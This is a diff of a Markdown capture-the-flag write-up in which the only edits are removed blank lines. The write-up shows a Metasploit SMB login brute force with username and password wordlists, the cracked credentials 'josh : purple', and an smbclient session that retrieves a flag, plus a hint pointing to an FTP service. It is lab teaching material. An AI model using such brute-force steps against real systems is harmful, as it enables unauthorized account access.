@@ -45,7 +45,6 @@ bob
 nancy
 alice
 ```
-
 ![Step 2](./2.png)
 
 ### 🔹 Step 3: Set Wordlists in Metasploit
@@ -54,15 +53,12 @@ set USER_FILE users.txt
 set PASS_FILE /root/Desktop/wordlists/unix_passwords.txt
 run
 ```
-
 ![Step 3](./3.png)
 
 ### 🔹 Step 4: Valid Credentials Found
 ```yaml
 josh : purple
 ```
-
-
 ![Step 4](./4.png)
 
 ### 🔹 Step 5: Access SMB Share Using `smbclient`
@@ -74,7 +70,6 @@ Password: purple
 ls
 get flag2.txt
 ```
-
 ![Step 5](./5.png)
 
 ### 🔹 Step 6: View the Retrieved Flag
@@ -87,7 +82,6 @@ FLAG2{a744a6f69c0747398f2648e10f32b8d4}
 ```
 Also contains a hint for the next step:
 Psst! I heard there is an FTP service running. Find it and check the banner.
-
 ![Step 6](./6.png)
 
 ## Conclusion
